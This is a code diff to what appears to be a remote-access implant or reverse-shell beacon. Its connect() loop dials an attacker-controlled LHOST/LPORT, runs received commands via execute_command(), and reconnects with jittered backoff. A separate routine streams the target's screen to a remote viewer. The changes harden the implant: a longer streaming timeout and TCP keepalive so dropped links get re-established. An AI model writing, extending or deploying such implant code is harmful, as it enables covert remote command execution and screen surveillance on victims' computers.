@@ -976,7 +976,10 @@ def _s2_run(target_id: str) -> None:
             break
         if conn is None:
             continue
-        conn.settimeout(2.0)
+        # 30s: this timeout also governs sendall(); with 2s any transient
+        # websockify/browser backpressure raised socket.timeout and killed
+        # the viewer every few seconds (auto-reconnect loop)
+        conn.settimeout(30.0)
         writer = _S2SockWriter(conn)
         w, h, fps = STREAM2_DEF_W, STREAM2_DEF_H, STREAM2_DEF_FPS
         info.update(state="streaming", viewers=1)
@@ -1191,18 +1194,38 @@ def execute_command(cmd: str) -> bytes:
     return output + MARKER
 
 
+def _enable_tcp_keepalive(sock: socket.socket) -> None:
+    """Keepalive so a silently-dead link (listener killed without RST,
+    NAT/firewall dropping the mapping) cannot hang recv() forever: the OS
+    probes the peer and force-closes the socket, which raises in recv() and
+    lets the reconnect loop run. Probe after 15s idle, every 5s, 3 fails ->
+    dead link detected within ~30s."""
+    try:
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+        if os.name == "nt":
+            sock.ioctl(socket.SIO_KEEPALIVE_VALS, (1, 15000, 5000))
+        else:
+            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 15)
+            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 5)
+            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 3)
+    except OSError:
+        pass
+
+
 def connect() -> None:
     """Main loop - connect, execute commands, reconnect on failure.
 
-    Runs forever: if the listener drops the session (or the link resets), the
-    socket is closed and the beacon keeps retrying with a jittered backoff
-    until the listener is back - then it stops retrying and serves normally.
+    Runs forever: if the listener drops the session (clean close, reset, or a
+    silently-dead link surfaced by TCP keepalive), the socket is closed and
+    the beacon keeps retrying with a jittered backoff until the listener is
+    back - then it stops retrying and serves normally.
     """
     delay = float(RECONNECT_DELAY)
     while True:
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.connect((LHOST, LPORT))
+            _enable_tcp_keepalive(sock)
         except (ConnectionRefusedError, OSError):
             time.sleep(delay * random.uniform(0.75, 1.25))
             # back off gradually (cap 60s) so a down listener isn't hammered
